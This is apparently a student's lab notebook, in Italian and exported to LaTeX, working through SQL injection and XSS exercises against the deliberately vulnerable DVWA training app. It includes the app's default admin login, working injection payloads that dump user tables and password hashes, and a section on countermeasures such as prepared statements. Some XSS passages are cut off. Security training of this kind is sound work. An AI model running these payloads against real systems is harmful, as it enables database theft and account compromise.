
% Default to the notebook output style

    


% Inherit from the specified cell style.




    
\documentclass[11pt]{article}

    
    
    \usepackage[T1]{fontenc}
    % Nicer default font (+ math font) than Computer Modern for most use cases
    \usepackage{mathpazo}

    % Basic figure setup, for now with no caption control since it's done
    % automatically by Pandoc (which extracts ![](path) syntax from Markdown).
    \usepackage{graphicx}
    % We will generate all images so they have a width \maxwidth. This means
    % that they will get their normal width if they fit onto the page, but
    % are scaled down if they would overflow the margins.
    \makeatletter
    \def\maxwidth{\ifdim\Gin@nat@width>\linewidth\linewidth
    \else\Gin@nat@width\fi}
    \makeatother
    \let\Oldincludegraphics\includegraphics
    % Set max figure width to be 80% of text width, for now hardcoded.
    \renewcommand{\includegraphics}[1]{\Oldincludegraphics[width=.8\maxwidth]{#1}}
    % Ensure that by default, figures have no caption (until we provide a
    % proper Figure object with a Caption API and a way to capture that
    % in the conversion process - todo).
    \usepackage{caption}
    \DeclareCaptionLabelFormat{nolabel}{}
    \captionsetup{labelformat=nolabel}

    \usepackage{adjustbox} % Used to constrain images to a maximum size 
    \usepackage{xcolor} % Allow colors to be defined
    \usepackage{enumerate} % Needed for markdown enumerations to work
    \usepackage{geometry} % Used to adjust the document margins
    \usepackage{amsmath} % Equations
    \usepackage{amssymb} % Equations
    \usepackage{textcomp} % defines textquotesingle
    % Hack from http://tex.stackexchange.com/a/47451/13684:
    \AtBeginDocument{%
        \def\PYZsq{\textquotesingle}% Upright quotes in Pygmentized code
    }
    \usepackage{upquote} % Upright quotes for verbatim code
    \usepackage{eurosym} % defines \euro
    \usepackage[mathletters]{ucs} % Extended unicode (utf-8) support
    \usepackage[utf8x]{inputenc} % Allow utf-8 characters in the tex document
    \usepackage{fancyvrb} % verbatim replacement that allows latex
    \usepackage{grffile} % extends the file name processing of package graphics 
                         % to support a larger range 
    % The hyperref package gives us a pdf with properly built
    % internal navigation ('pdf bookmarks' for the table of contents,
    % internal cross-reference links, web links for URLs, etc.)
    \usepackage{hyperref}
    \usepackage{longtable} % longtable support required by pandoc >1.10
    \usepackage{booktabs}  % table support for pandoc > 1.12.2
    \usepackage[inline]{enumitem} % IRkernel/repr support (it uses the enumerate* environment)
    \usepackage[normalem]{ulem} % ulem is needed to support strikethroughs (\sout)
                                % normalem makes italics be italics, not underlines
    

    
    
    % Colors for the hyperref package
    \definecolor{urlcolor}{rgb}{0,.145,.698}
    \definecolor{linkcolor}{rgb}{.71,0.21,0.01}
    \definecolor{citecolor}{rgb}{.12,.54,.11}

    % ANSI colors
    \definecolor{ansi-black}{HTML}{3E424D}
    \definecolor{ansi-black-intense}{HTML}{282C36}
    \definecolor{ansi-red}{HTML}{E75C58}
    \definecolor{ansi-red-intense}{HTML}{B22B31}
    \definecolor{ansi-green}{HTML}{00A250}
    \definecolor{ansi-green-intense}{HTML}{007427}
    \definecolor{ansi-yellow}{HTML}{DDB62B}
    \definecolor{ansi-yellow-intense}{HTML}{B27D12}
    \definecolor{ansi-blue}{HTML}{208FFB}
    \definecolor{ansi-blue-intense}{HTML}{0065CA}
    \definecolor{ansi-magenta}{HTML}{D160C4}
    \definecolor{ansi-magenta-intense}{HTML}{A03196}
    \definecolor{ansi-cyan}{HTML}{60C6C8}
    \definecolor{ansi-cyan-intense}{HTML}{258F8F}
    \definecolor{ansi-white}{HTML}{C5C1B4}
    \definecolor{ansi-white-intense}{HTML}{A1A6B2}

    % commands and environments needed by pandoc snippets
    % extracted from the output of `pandoc -s`
    \providecommand{\tightlist}{%
      \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
    \DefineVerbatimEnvironment{Highlighting}{Verbatim}{commandchars=\\\{\}}
    % Add ',fontsize=\small' for more characters per line
    \newenvironment{Shaded}{}{}
    \newcommand{\KeywordTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{{#1}}}}
    \newcommand{\DataTypeTok}[1]{\textcolor[rgb]{0.56,0.13,0.00}{{#1}}}
    \newcommand{\DecValTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{{#1}}}
    \newcommand{\BaseNTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{{#1}}}
    \newcommand{\FloatTok}[1]{\textcolor[rgb]{0.25,0.63,0.44}{{#1}}}
    \newcommand{\CharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{{#1}}}
    \newcommand{\StringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{{#1}}}
    \newcommand{\CommentTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textit{{#1}}}}
    \newcommand{\OtherTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{{#1}}}
    \newcommand{\AlertTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{{#1}}}}
    \newcommand{\FunctionTok}[1]{\textcolor[rgb]{0.02,0.16,0.49}{{#1}}}
    \newcommand{\RegionMarkerTok}[1]{{#1}}
    \newcommand{\ErrorTok}[1]{\textcolor[rgb]{1.00,0.00,0.00}{\textbf{{#1}}}}
    \newcommand{\NormalTok}[1]{{#1}}
    
    % Additional commands for more recent versions of Pandoc
    \newcommand{\ConstantTok}[1]{\textcolor[rgb]{0.53,0.00,0.00}{{#1}}}
    \newcommand{\SpecialCharTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{{#1}}}
    \newcommand{\VerbatimStringTok}[1]{\textcolor[rgb]{0.25,0.44,0.63}{{#1}}}
    \newcommand{\SpecialStringTok}[1]{\textcolor[rgb]{0.73,0.40,0.53}{{#1}}}
    \newcommand{\ImportTok}[1]{{#1}}
    \newcommand{\DocumentationTok}[1]{\textcolor[rgb]{0.73,0.13,0.13}{\textit{{#1}}}}
    \newcommand{\AnnotationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{{#1}}}}}
    \newcommand{\CommentVarTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{{#1}}}}}
    \newcommand{\VariableTok}[1]{\textcolor[rgb]{0.10,0.09,0.49}{{#1}}}
    \newcommand{\ControlFlowTok}[1]{\textcolor[rgb]{0.00,0.44,0.13}{\textbf{{#1}}}}
    \newcommand{\OperatorTok}[1]{\textcolor[rgb]{0.40,0.40,0.40}{{#1}}}
    \newcommand{\BuiltInTok}[1]{{#1}}
    \newcommand{\ExtensionTok}[1]{{#1}}
    \newcommand{\PreprocessorTok}[1]{\textcolor[rgb]{0.74,0.48,0.00}{{#1}}}
    \newcommand{\AttributeTok}[1]{\textcolor[rgb]{0.49,0.56,0.16}{{#1}}}
    \newcommand{\InformationTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{{#1}}}}}
    \newcommand{\WarningTok}[1]{\textcolor[rgb]{0.38,0.63,0.69}{\textbf{\textit{{#1}}}}}
    
    
    % Define a nice break command that doesn't care if a line doesn't already
    % exist.
    \def\br{\hspace*{\fill} \\* }
    % Math Jax compatability definitions
    \def\gt{>}
    \def\lt{<}
    % Document parameters
    \title{Lab6}
    
    
    

    % Pygments definitions
    
\makeatletter
\def\PY@reset{\let\PY@it=\relax \let\PY@bf=\relax%
    \let\PY@ul=\relax \let\PY@tc=\relax%
    \let\PY@bc=\relax \let\PY@ff=\relax}
\def\PY@tok#1{\csname PY@tok@#1\endcsname}
\def\PY@toks#1+{\ifx\relax#1\empty\else%
    \PY@tok{#1}\expandafter\PY@toks\fi}
\def\PY@do#1{\PY@bc{\PY@tc{\PY@ul{%
    \PY@it{\PY@bf{\PY@ff{#1}}}}}}}
\def\PY#1#2{\PY@reset\PY@toks#1+\relax+\PY@do{#2}}

\expandafter\def\csname PY@tok@w\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.73,0.73}{##1}}}
\expandafter\def\csname PY@tok@c\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}
\expandafter\def\csname PY@tok@cp\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.74,0.48,0.00}{##1}}}
\expandafter\def\csname PY@tok@k\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@kp\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@kt\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.69,0.00,0.25}{##1}}}
\expandafter\def\csname PY@tok@o\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@ow\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.67,0.13,1.00}{##1}}}
\expandafter\def\csname PY@tok@nb\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@nf\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,1.00}{##1}}}
\expandafter\def\csname PY@tok@nc\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,1.00}{##1}}}
\expandafter\def\csname PY@tok@nn\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,1.00}{##1}}}
\expandafter\def\csname PY@tok@ne\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.82,0.25,0.23}{##1}}}
\expandafter\def\csname PY@tok@nv\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@no\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.53,0.00,0.00}{##1}}}
\expandafter\def\csname PY@tok@nl\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.63,0.63,0.00}{##1}}}
\expandafter\def\csname PY@tok@ni\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.60,0.60,0.60}{##1}}}
\expandafter\def\csname PY@tok@na\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.49,0.56,0.16}{##1}}}
\expandafter\def\csname PY@tok@nt\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@nd\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.67,0.13,1.00}{##1}}}
\expandafter\def\csname PY@tok@s\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@sd\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@si\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.73,0.40,0.53}{##1}}}
\expandafter\def\csname PY@tok@se\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.73,0.40,0.13}{##1}}}
\expandafter\def\csname PY@tok@sr\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.40,0.53}{##1}}}
\expandafter\def\csname PY@tok@ss\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@sx\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@m\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@gh\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,0.50}{##1}}}
\expandafter\def\csname PY@tok@gu\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.50,0.00,0.50}{##1}}}
\expandafter\def\csname PY@tok@gd\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.63,0.00,0.00}{##1}}}
\expandafter\def\csname PY@tok@gi\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.63,0.00}{##1}}}
\expandafter\def\csname PY@tok@gr\endcsname{\def\PY@tc##1{\textcolor[rgb]{1.00,0.00,0.00}{##1}}}
\expandafter\def\csname PY@tok@ge\endcsname{\let\PY@it=\textit}
\expandafter\def\csname PY@tok@gs\endcsname{\let\PY@bf=\textbf}
\expandafter\def\csname PY@tok@gp\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,0.50}{##1}}}
\expandafter\def\csname PY@tok@go\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.53,0.53,0.53}{##1}}}
\expandafter\def\csname PY@tok@gt\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.27,0.87}{##1}}}
\expandafter\def\csname PY@tok@err\endcsname{\def\PY@bc##1{\setlength{\fboxsep}{0pt}\fcolorbox[rgb]{1.00,0.00,0.00}{1,1,1}{\strut ##1}}}
\expandafter\def\csname PY@tok@kc\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@kd\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@kn\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@kr\endcsname{\let\PY@bf=\textbf\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@bp\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.50,0.00}{##1}}}
\expandafter\def\csname PY@tok@fm\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.00,0.00,1.00}{##1}}}
\expandafter\def\csname PY@tok@vc\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@vg\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@vi\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@vm\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.10,0.09,0.49}{##1}}}
\expandafter\def\csname PY@tok@sa\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@sb\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@sc\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@dl\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@s2\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@sh\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@s1\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.73,0.13,0.13}{##1}}}
\expandafter\def\csname PY@tok@mb\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@mf\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@mh\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@mi\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@il\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@mo\endcsname{\def\PY@tc##1{\textcolor[rgb]{0.40,0.40,0.40}{##1}}}
\expandafter\def\csname PY@tok@ch\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}
\expandafter\def\csname PY@tok@cm\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}
\expandafter\def\csname PY@tok@cpf\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}
\expandafter\def\csname PY@tok@c1\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}
\expandafter\def\csname PY@tok@cs\endcsname{\let\PY@it=\textit\def\PY@tc##1{\textcolor[rgb]{0.25,0.50,0.50}{##1}}}

\def\PYZbs{\char`\\}
\def\PYZus{\char`\_}
\def\PYZob{\char`\{}
\def\PYZcb{\char`\}}
\def\PYZca{\char`\^}
\def\PYZam{\char`\&}
\def\PYZlt{\char`\<}
\def\PYZgt{\char`\>}
\def\PYZsh{\char`\#}
\def\PYZpc{\char`\%}
\def\PYZdl{\char`\$}
\def\PYZhy{\char`\-}
\def\PYZsq{\char`\'}
\def\PYZdq{\char`\"}
\def\PYZti{\char`\~}
% for compatibility with earlier versions
\def\PYZat{@}
\def\PYZlb{[}
\def\PYZrb{]}
\makeatother


    % Exact colors from NB
    \definecolor{incolor}{rgb}{0.0, 0.0, 0.5}
    \definecolor{outcolor}{rgb}{0.545, 0.0, 0.0}



    
    % Prevent overflowing lines due to hard-to-break entities
    \sloppy 
    % Setup hyperref package
    \hypersetup{
      breaklinks=true,  % so long urls are correctly broken across lines
      colorlinks=true,
      urlcolor=urlcolor,
      linkcolor=linkcolor,
      citecolor=citecolor,
      }
    % Slightly bigger margins than the latex defaults
    
    \geometry{verbose,tmargin=1in,bmargin=1in,lmargin=1in,rmargin=1in}
    
    

    \begin{document}
    
    
    \maketitle
    
    

    
    \hypertarget{laboratorio-6}{%
\section{Laboratorio 6}\label{laboratorio-6}}

    10.10.15.4/dvwa/security.php

login: admin

password: password

    \hypertarget{exercise-1-sql-injection-warmup-security-low}{%
\section{Exercise \#1: SQL injection warmup (security
low)}\label{exercise-1-sql-injection-warmup-security-low}}

    SQL injection è una tecnica di code injection che sfrutta le
vulnerabilità nell'interfaccia tra applicazioni Web e server di
database. La vulnerabilità è presente quando gli input dell'utente non
vengono controllati correttamente all'interno delle applicazioni Web
prima di essere inviati al back- server di database finali. Molte
applicazioni Web accettano input dagli utenti e quindi li utilizzano
input per costruire query SQL, in modo che le applicazioni Web possano
ottenere informazioni da Banca dati. L'obiettivo di questa attività è
familiarizzare con l'iniezione SQL giocando con la primissima (e
semplice) iniezione per recuperare tutti gli utenti nel database.

    1' or 1=1\#

First name: admin Surname:admin First name: Gordon Surname:Brown First
name: Hack Surname:Me First name: Pablo Surname:Pucasso First name: Bob
Surname:smith

spiegazione: questo stato è sempre vero quindi ritorna tutta la tabella

    \hypertarget{exercise-2-information-leak-security-low}{%
\section{Exercise \#2: Information leak (security
low)}\label{exercise-2-information-leak-security-low}}

    SQL injection è fondamentalmente una tecnica attraverso la quale gli
aggressori possono eseguire le proprie istruzioni SQL dannose
generalmente indicate come payload dannoso. Attraverso i malicious SQL
statements, gli aggressori possono rubare informazioni dal database
delle vittime. L'obiettivo di questa attività è di ottenere informazioni
sulle tabelle del database e sul server di hosting (ad es. in esecuzione
SO o nome host macchina).

    1' UNION select 1, version()\# stampa il numero di versione del server
MySQL in esecuzione

La funzione MySQL user()stampa lo user name attuale e l'host da cui è
partita la connessione SQL

1' UNION select 1, user()\# L'utente SQL usato dall'applicazione DVWA è
root. Il database è ospitato sullo stesso host dall'applicazione

1' UNION select 1, table\_name!!FROM information\_schema.tables!!WHERE
table\_schema = `dvwa'\#!

Otteniamo le due tabelle guestbook e users

    \hypertarget{exercise-3-steal-account-credentials-security-low}{%
\section{Exercise \#3: Steal account credentials (security
low)}\label{exercise-3-steal-account-credentials-security-low}}

    La memorizzazione delle credenziali dell'account in un database è sempre
un punto cruciale, le password dovrebbero essere sempre hashed, quindi
se un hacker li ruba attraverso un'inkection SQL, sarebbero ancora
protette. Con l'ultimo esercizio hai scoperto alcuni nomi di tabelle,
puoi individuare informazioni sulle password degli account? Quale
algoritmo di crittografia viene utilizzato? Extra 3.1: se lo desideri,
puoi provare ad accedere come utente arbitrario aggiornando la password
di un determinato account con il tuo hash preferito; ma ricorda che nel
mondo reale questo apporta modifiche irreversibili al database, inoltre
la tua attività potrebbe essere registrata da qualche parte.

    ID: 1' union select 1, password from users \# First name: admin Surname:
admin

ID: 1' union select 1, password from users \# First name: 1 Surname:
5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' union select 1, password from users \# First name: 1 Surname:
e99a18c428cb38d5f260853678922e03

ID: 1' union select 1, password from users \# First name: 1 Surname:
8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' union select 1, password from users \# First name: 1 Surname:
0d107d09f5bbe40cade3de5c71e9e9b7

    \hypertarget{exercise-4-read-arbitrary-file-security-low}{%
\section{Exercise \#4: Read arbitrary file (security
low)}\label{exercise-4-read-arbitrary-file-security-low}}

    In linguaggio SQL (con la giusta funzione) è possibile leggere un file e
restituirlo come una stringa. Come hacker possiamo provare a leggere un
file dal sistema remoto. Il file che siamo sempre alla ricerca è
ovviamente il passwd in cui erano archiviati i sistemi Linux più vecchi
Le password. È possibile stampare con un'injection SQL il file della
password?

    ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: admin
Surname: admin

ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: 1 Surname:
1 : admin : adminadmin : 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: 1 Surname:
2 : Gordon : Browngordonb : e99a18c428cb38d5f260853678922e03

ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: 1 Surname:
3 : Hack : Me1337 : 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: 1 Surname:
4 : Pablo : Picassopablo : 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' union select 1, concat(user\_id, ' : ' , first\_name, ' : ' ,
last\_name, user, ' : ', password) from users \# First name: 1 Surname:
5 : Bob : Smithsmithy : 5f4dcc3b5aa765d61d8327deb882cf99

    \hypertarget{exercise-5-countermeasure}{%
\section{Exercise \#5: Countermeasure}\label{exercise-5-countermeasure}}

    Il problema fondamentale della vulnerabilità dell'SQL injection è la
mancata di separazione del codice dai dati. Quando si costruisce
un'istruzione SQL, il programma (ad esempio il programma PHP) lo sa
quale parte sono i dati e quale parte è il codice. Sfortunatamente,
quando viene inviata l'istruzione SQL il database, il confine è
scomparso. Nella parte inferiore della pagina Web è possibile
visualizzare il codice sorgente PHP, con quel codice in mente puoi
descriverlo in poche parole in un modo evitare il problema di iniezione
SQL?

    L'applicazione costruisce un comando SQL utilizzando un input esterno e
non neutralizza(o lo fa in modoerrato) caratterispecialidel linguaggi
SQL

Possiamo implementare un filtro dei caratteri speciali SQL. linguaggi
dinamici forniscono già funzioni filtro pronte e robuste. Ad esempio, in
PHP: mysql\_real\_escape\_string()

Il filtro inibisce le iniezioni basate su apici. Purtroppo esistono
anche iniezioni con argomenti interi (che non fanno uso di apici). Ad
esempio, l'input: 1 OR 1=1 è OK per il filtro. Conseguenza: vengono
stampati tutti i record della tabella

Attivando la script security a livello ``high'', lo script sql (abusato
fin ora) quota l'argomento \$id nella query Il quoting dell'argomento
annulla il significato semantico dell'operatore OR, che viene visto come
una semplice stringa

La mitigazione più potente consiste nell'uso di prepared statement. Si
tratta di uno strumento per l'esecuzione efficiente e sicura di query
SQL

Viene preparato un template per le query- Tale modello, contenente il
carattere ? al posto dei parametri, viene inviato al server SQL una sola
volta. Il server SQL compila la query parametrizzata e la memorizza
senza eseguirla Il client lega i parametri formali a valori concreti e
li invia al server SQL (anche più volte). Il server inserisce i
parametri nell'oggetto compilato ed esegue la query

L'uso di prepared statement protegge da attacchi basatisu SQL Injection.
Motivo: La separazione tra istruzioni SQL e dati evita che istruzioni
malevole entrino a far parte del template. Di conseguenza, i dati sono
manipolati al di fuori delle istruzioni SQL

    \hypertarget{exercise-6-xss-warmup-security-low}{%
\section{Exercise \#6: XSS warmup (security
low)}\label{exercise-6-xss-warmup-security-low}}

    Un XSS consente a un utente malintenzionato di inserire uno script nel
contenuto di un sito Web o di un'app. Quando l'utente visita la pagina
infetta, lo script verrà eseguito nel browser della vittima. Questo
permette agli aggressori di rubare informazioni private come cookie,
informazioni sull'account o per eseguire operazioni personalizzate
mentre impersonano l'identità della vittima. Sotto XSS reflected puoi
trovare una semplice pagina web, il tuo obiettivo per questa sezione è
quello di creare un URL che, quando viene cliccato, visualizza il cookie
della vittima in un avviso.

    Analizzando il codice sorgente si può notare come non ci sia alcun
controllo in input sulla variabile \$\_GET{[}`name'{]}:

security=low; PHPSESSID= 2bba2db1ea9a60702ff9b91dddb59b4c

    \hypertarget{exercise-7-advanced-xss-reflected-security-medium}{%
\section{Exercise \#7: Advanced XSS reflected (security
medium)}\label{exercise-7-advanced-xss-reflected-security-medium}}

    Niente più dettagli, puoi fare lo stesso di prima con il livello di
sicurezza DVWA impostato su medium? Per verificare una possibile
vulnerabilità XSS, è necessario testare ogni punto dell'input
dell'utente per vedere se puoi inserire codice HTML e JavaScript e se
viene consegnato all'output di pagina.

Extra 7.1, puoi fare lo stesso di prima con il livello di sicurezza DVWA
impostato su high?

    no con medium e high non è più possibile usare

con il livello medium viene filtrata dalla stringa

con medium non è possibile filtrare questo elemento

no con high non è possibile, tutto JavaScript verrà bloccato perché il
codice rimuoverà il modello ``\textless{}s * c * r * i * p * t''. Dato
che non possiamo iniettare alcun codice che inizia con il tag

, possiamo usare eventi HTML per l'iniezione di codice poiché non ci
sarà alcun tag

incluso.

    \hypertarget{exercise-8-simple-blog-post-security-low}{%
\section{Exercise \#8: Simple blog post (security
low)}\label{exercise-8-simple-blog-post-security-low}}

    Un utente malintenzionato utilizza XSS memorizzato per iniettare
contenuto dannoso (payload), molto spesso JavaScript codice,
nell'applicazione di destinazione. Se non è presente alcuna convalida
dell'input, questo codice dannoso è memorizzato in modo permanente
(persistente) dall'applicazione di destinazione. Quando una vittima apre
la pagina Web in un browser, il payload di attacco XSS viene pubblicato
nel browser della vittima come parte di il codice HTML. Ciò significa
che le vittime finiranno per eseguire lo script malevolo una volta che
la pagina viene visualizzata nel loro browser. L'obiettivo di questa
attività è quello di iniettare codice dannoso che fa apparire il cookie
per ogni utente che visita la pagina Web.

    mettendo nel campo message

Poiché si tratta di un attacco XSS memorizzato, questo sarà persistente
fino alla cancellazione del Guestbook. ogni volta che un utente visita
questa scheda, il suo ID di sessione verrà visualizzato in un avviso

    \hypertarget{exercise-9-avoiding-sanitization-security-medium}{%
\section{Exercise \#9: Avoiding sanitization (security
medium)}\label{exercise-9-avoiding-sanitization-security-medium}}

    Impostare il livello di sicurezza su medio e provare a fare lo stesso di
prima. Con la sicurezza impostata su medio, una certa sanificazione dei
campi di input viene eseguita dopo aver inviato la posta al server. Il
tuo l'obiettivo è bypassare la sanificazione al fine di memorizzare
correttamente XSS nel database.

    Con medium non funziona più. Usiamo il tag body per iniettare la
stringa. evito di mettere script


    % Add a bibliography block to the postdoc
    
    
    
    \end{document}
